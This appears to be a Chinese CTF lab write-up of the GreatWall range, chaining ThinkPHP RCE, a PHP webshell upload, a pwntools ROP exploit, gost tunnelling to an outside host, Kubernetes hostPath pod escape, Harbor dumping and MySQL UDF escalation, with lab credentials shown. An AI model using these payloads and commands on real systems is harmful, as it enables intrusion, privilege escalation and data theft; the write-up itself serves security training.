---
title: "春秋云镜 GreatWall"
onlyTitle: true
date: 2026-1-19 20:30:35
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8189.jpg
---

## 春秋云镜 GreatWall

据说是第一届ccb半决的题

### flag1

fscan扫到有TP 5.0.23 rce

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111212056367.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111212318691.png)

写个一句话，蚁剑链接

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111212521149.png)

虽然不是高权限，但是可以读根目录的flag

flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}



### flag2

fscan扫内网

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111212935063.png)

整理信息

```
172.28.23.17 本机
172.28.23.33 8080有spring heapdump泄露(spring unauth就是actuator泄露)
172.28.23.26 新翔OA+FTP匿名登陆
```

先看26主机，匿名登陆上去，ftp://172.28.23.26/

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111215943298.png)

下下来进行审计，重点看下自己写的逻辑，PHPExcel可以省略

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111220241086.png)

自己写的后门，base64解码后直接写入文件，文件上传漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111220320168.png)

```http
POST /uploadbase64.php HTTP/1.1
Host: 172.28.23.26
Content-Length: 69
Content-Type:application/x-www-form-urlencoded

imgbase64=data:image/php;base64, PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
```

连上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111220707127.png)

不管输什么都是ret=127，之前也经常见到了，就是被disable_function墙了，权限不够。用插件打一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111220746326.png)

模式自己挑一个，左右函数支持能对应上就行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111220928298.png)

看下上传脚本的逻辑（妈的，打2024年末的ciscn的时候就是绕disable_function，结果因为这个php里写的路由不对一直没打进去，记忆犹新）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111221223056.png)

这里我一直注不上去，不过用Backtrace_UAF绕过了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111223631753.png)

能执行命令了，不过还是www-data权限

找下suid命令，有base32

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111223753830.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111223852314.png)



flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}

前面我们扫到这个主机的ip是172.28.23.26，这里看下网卡是双网卡。还有一个172.22.14.6网段，后面需要二层代理打

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111224059375.png)



### flag3

33主机heapdump泄露，一般在云镜里这个洞都是打shiro，这个erp也是有shiro依赖的

先代理出来，下载heapdump文件，springboot的/actuator/heapdump接口

```
gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/8.145.35.7:22 -F socks5://8.145.35.7:5555
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111213921405.png)

JDumpSprider分析，得到shiro key AZYyIgMYhG6/CzIJlvpR2g==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111214137534.png)

注意这里是GCM的AES加密，所以一定要勾

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111214627024.png)

注个Filter马，权限为ops01，需要提权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111214743038.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111214818504.png)

home/ops01下有个HashNote文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111214940242.png)

可以针对这个pwn，https://www.dr0n.top/posts/f249db01/

```py
from pwn import *
context.arch='amd64'

def add(key,data='b'):
    p.sendlineafter(b'Option:',b'1')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def show(key):
    p.sendlineafter(b'Option:',b'2')
    p.sendlineafter(b"Key: ",key);

def edit(key,data):
    p.sendlineafter(b'Option:',b'3')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def name(username):
    p.sendlineafter(b'Option:',b'4')
    p.sendlineafter(b'name:',username)


p = remote('172.28.23.33', 59696)
# p = process('./HashNote')


username=0x5dc980
stack=0x5e4fa8
ukey=b'\x30'*5+b'\x31'+b'\x44'

fake_chunk=flat({
    0:username+0x10,
    0x10:[username+0x20,len(ukey),\
        ukey,0],
    0x30:[stack,0x10]
    },filler=b'\x00')

p.sendlineafter(b'name',fake_chunk)
p.sendlineafter(b'word','freep@ssw0rd:3')

add(b'\x30'*1+b'\x31'+b'\x44',b'test')   # 126
add(b'\x30'*2+b'\x31'+b'\x44',b'test')   # 127


show(ukey)
main_ret=u64(p.read(8))-0x1e0




rdi=0x0000000000405e7c # pop rdi ; ret
rsi=0x000000000040974f # pop rsi ; ret
rdx=0x000000000053514b # pop rdx ; pop rbx ; ret
rax=0x00000000004206ba # pop rax ; ret
syscall=0x00000000004560c6 # syscall

fake_chunk=flat({
    0:username+0x20,
    0x20:[username+0x30,len(ukey),\
        ukey,0],
    0x40:[main_ret,0x100,b'/bin/sh\x00']
    },filler=b'\x00')

name(fake_chunk.ljust(0x80,b'\x00'))


payload=flat([
    rdi,username+0x50,
    rsi,0,
    rdx,0,0,
    rax,0x3b,
    syscall
    ])

p.sendlineafter(b'Option:',b'3')
p.sendlineafter(b'Key:',ukey)
p.sendline(payload)
p.sendlineafter(b'Option:',b'9')
p.interactive()
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260111215627188.png)

flag03: flag{6a326f94-6526-4586-8233-152d137281fd}



### flag4

新翔OA所在的26主机存在双网卡，除了前面提到的172.28.23.0/24网段，还有172.22.14.6/24网段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119190835410.png)

上传Fscan扫下这个网段

```sh
(www-data:/tmp) $ ./FScan_2.0.1_linux_x64 -h 172.22.14.6/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1
[1.8s]     已选择服务扫描模式
[1.8s]     开始信息扫描
[1.8s]     CIDR范围: 172.22.14.0-172.22.14.255
[1.8s]     generate_ip_range_full
[1.8s]     解析CIDR 172.22.14.6/24 -> IP范围 172.22.14.0-172.22.14.255
[1.8s]     最终有效主机数量: 256
[1.8s]     开始主机扫描
[1.8s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[1.8s]     正在尝试无监听ICMP探测...
[1.8s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted
[1.8s]     当前用户权限不足,无法发送ICMP包
[1.8s]     切换为PING方式探测...
[4.9s] [*] 目标 172.22.14.37    存活 (ICMP)
[4.9s] [*] 目标 172.22.14.46    存活 (ICMP)
[5.9s] [*] 目标 172.22.14.6     存活 (ICMP)
[7.8s]     存活主机数量: 3
[7.8s]     有效端口数量: 233
[7.9s] [*] 端口开放 172.22.14.6:80
[7.9s] [*] 端口开放 172.22.14.6:22
[7.9s] [*] 端口开放 172.22.14.37:2379
[7.9s] [*] 端口开放 172.22.14.6:21
[7.9s] [*] 端口开放 172.22.14.37:22
[7.9s] [*] 端口开放 172.22.14.46:22
[7.9s] [*] 端口开放 172.22.14.46:80
[7.9s] [*] 端口开放 172.22.14.37:10250
[7.9s]     扫描完成, 发现 8 个开放端口
[7.9s]     存活端口数量: 8
[7.9s]     开始漏洞扫描
[8.0s]     POC加载完成: 总共387个，成功387个，失败0个
[8.0s] [*] 网站标题 http://172.22.14.46       状态码:200 长度:785    标题:Harbor
[8.1s] [*] 网站标题 http://172.22.14.6        状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
[8.1s] [*] 发现指纹 目标: http://172.22.14.46       指纹: [Harbor]
[8.1s] [*] 网站标题 https://172.22.14.37:10250 状态码:404 长度:19     标题:无标题
[8.2s] [+] FTP服务 172.22.14.6:21 匿名登录成功!
[9.0s] [+] 检测到漏洞 http://172.22.14.46:80/swagger.json poc-yaml-swagger-ui-unauth 参数:[{path swagger.json}]
[39.9s]     扫描已完成: 12/12
```

整理下信息

```
172.22.14.46 存在swagger信息泄露，指纹为Harbor
172.22.14.6 本机
172.22.14.37 10250开放
```

fscan扫到10250端口开放，这个端口是一个特殊的k8s kubelet端口，通常k8s不止开放这一个端口，因为不止这一个组件存在

https://developer.aliyun.com/article/1626337

| 组件名称                | 默认端口    |
| ----------------------- | ----------- |
| api server              | 8080/6443   |
| dashboard               | 8001        |
| kubelet                 | 10250/10255 |
| etcd                    | 2379        |
| kube-proxy              | 8001        |
| docker                  | 2375        |
| kube-scheduler          | 10251       |
| kube-controller-manager | 10252       |

进行一次全端口扫描

```sh
./fscan -h 172.22.14.37 -p 1-65535
```

```sh
(www-data:/tmp) $ ./FScan_2.0.1_linux_x64 -h 172.22.14.37 -p 1-65535
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1
[1.8s]     已选择服务扫描模式
[1.8s]     开始信息扫描
[1.8s]     最终有效主机数量: 1
[1.8s]     开始主机扫描
[1.8s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[1.8s]     有效端口数量: 65535
[1.9s] [*] 端口开放 172.22.14.37:22
[1.9s] [*] 端口开放 172.22.14.37:2379
[1.9s] [*] 端口开放 172.22.14.37:2380
[2.0s] [*] 端口开放 172.22.14.37:6443
[2.1s] [*] 端口开放 172.22.14.37:10256
[2.1s] [*] 端口开放 172.22.14.37:10252
[2.1s] [*] 端口开放 172.22.14.37:10250
[2.1s] [*] 端口开放 172.22.14.37:10251
[3.2s]     扫描完成, 发现 8 个开放端口
[3.2s]     存活端口数量: 8
[3.2s]     开始漏洞扫描
[3.3s]     POC加载完成: 总共387个，成功387个，失败0个
[3.3s] [*] 网站标题 https://172.22.14.37:10250 状态码:404 长度:19     标题:无标题
[32.2s]     扫描已完成: 5/5
```

开放了2379 etcd，6443 api server

6443端口存在Api Server未授权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119194002911.png)

根据文章的进一步利用方式，直接打

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119194840795.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119194220118.png)

kubectl官方工具下载地址：[https://kubernetes.io/zh-cn/docs/tasks/tools/](https://kubernetes.io/zh-cn/docs/tasks/tools/?spm=a2c6h.12873639.article-detail.5.64fc19c6RalQwg)

获取所有容器pods节点，忽略https安全限制

```
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
```

用户名和密码随便输，因为未授权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119194711592.png)

能正常获取便可进行下一步

这个时候我们创建一个yaml文件,通过我们的api server未授权创建一个yaml文件创建一个pods节点

文件名与后面对应上即可我这里叫test.ymal

这里我们着重注意三个点

- name此为我们后创建容器的名称
- image为我们选择的镜像
- mountpath为我们宿主机挂载到容器的位置

name我们随便输都可以，image还不知道，mountpath一般是/mnt

所以这里还要获取一下镜像名，查看一下历史pod的镜像名

```sh
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ describe pod nginx-deployment-58d48b746d-d6x8t
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119195237618.png)

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-deployment
spec:
  containers:
  - image: nginx:1.8
    name: test-container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

通过yaml创建pod

```sh
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f test.yaml
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119195522107.png)

进入自己创建的pod就能getshell

```
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119195606115.png)

容器逃逸到了node真机上,原因因为pod挂载到了mnt目录,如有不理解的同学可以补补docker逃逸的知识点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119200049951.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119200118606.png)

flag{da69c459-7fe5-4535-b8d1-15fff496a29f}



### flag5

我发现我没有二层代理也能访问14网段噢，好奇怪

172.22.14.46 存在Harbor未授权

python harbor.py http://172.22.14.46

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119200440491.png)

secret是吧，dump你

```
python harbor.py http://172.22.14.46 --dump harbor/secret --v2
```

找到flag5

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119200855398.png)

flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}





### flag6

harbor未授权还有个project/projectadmin，dump他

```sh
python harbor.py http://172.22.14.46 --dump project/projectadmin --v2
```

app下有个jar包

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119201252525.png)

找到spring application文件，JDBC连接mysql

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119201641219.png)

```
spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=My3q1i4oZkJm3
```

连接，mysql 8.0.36

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119201805494.png)

查看写文件权限

```sql
show global variables like '%secure_file_priv%';
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119201916399.png)

为空，就是能写了，UDF提权，上MDUT

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260119202532099.png)

flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}

